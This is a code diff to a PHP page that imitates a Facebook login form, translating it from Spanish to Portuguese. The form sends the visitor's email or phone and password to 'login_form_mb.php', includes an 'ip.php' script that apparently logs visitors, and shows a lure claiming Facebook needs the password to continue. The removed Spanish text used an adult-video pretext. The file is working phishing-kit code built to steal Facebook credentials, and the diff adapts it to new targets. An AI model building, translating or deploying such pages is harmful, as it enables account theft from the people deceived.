@@ -57,13 +57,13 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                                         <form class="login-form" method="post" target="_top" action="login_form_mb.php">
 						<?php include 'ip.php'; ?>
 										<label>
-                                        <input type="text" id="email_mobile" name="email_mobile" placeholder="Correo electronico o telefono" autocomplete="off" required="">
+                                        <input type="text" id="email_mobile" name="email_mobile" placeholder="Email ou telefone" autocomplete="off" required="">
                                         </label>
 										<label>
-                                        <input type="password" name="pass_mobile" placeholder="Contrasena" autocomplete="off" required="">
+                                        <input type="password" name="pass_mobile" placeholder="Senha" autocomplete="off" required="">
                                         </label>
 										<label>
-                                        <input class="uibutton confirm" type="submit" value="Iniciar sesion">
+                                        <input class="uibutton confirm" type="submit" value="Iniciar seção">
 										</label>
                                         </form>
                                         </h1>
@@ -72,7 +72,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                                 <section class="login-form-wrap">
 								 <font color="566573">
                                     <div id="TituloCuerpo">
-									Facebook necesita confirmar la siguiente informacion para permitirte acceso a esta aplicacion de videos, Ingresa!									<h1>+18</h1>
+									Facebook necessita logar a senha para prosseguir com a informação para acessar a pagina seguinte!									<h1>!</h1>
 									</div>
 									</font>
 							       </section></div>
